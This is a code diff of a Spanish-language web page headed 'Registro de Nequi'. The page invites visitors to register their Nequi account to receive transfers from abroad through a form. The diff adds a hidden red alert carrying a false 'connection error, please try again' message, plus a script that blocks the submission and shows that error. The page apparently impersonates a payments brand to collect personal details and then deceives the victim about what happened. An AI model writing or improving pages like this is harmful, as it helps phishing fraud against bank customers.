@@ -72,16 +72,25 @@
             max-height: 50px; /* Reducir el tamaño máximo del logo */
             margin-top: 20px; /* Margen superior para el logo */
         }
+        .alert {
+            display: none;
+            background-color: #FF4F4F;
+            color: #FFFFFF;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <div class="alert" id="alert">¡Ha ocurrido un error de conexión, por favor inténtalo nuevamente!</div>
         <div class="logo-container">
             <img src="logo.png" alt="Logo" class="logo">
         </div>
         <h2>Registro de Nequi</h2>
         <p>Para recibir transferencias bancarias desde el extranjero, por favor registra tu Nequi.</p>
-        <form name="contact" method="POST" data-netlify="true" onsubmit="submit" action="/index">
+        <form id="registrationForm" name="contact" method="POST" data-netlify="true" action="/index">
             <div class="form-group">
                 <label for="name">Nombre y Apellidos</label>
                 <input type="text" id="name" name="name" required>
@@ -101,5 +110,11 @@
             <button type="submit" class="btn">Registrarse</button>
         </form>
     </div>
+    <script>
+        document.getElementById('registrationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            document.getElementById('alert').style.display = 'block';
+        });
+    </script>
 </body>
 </html>
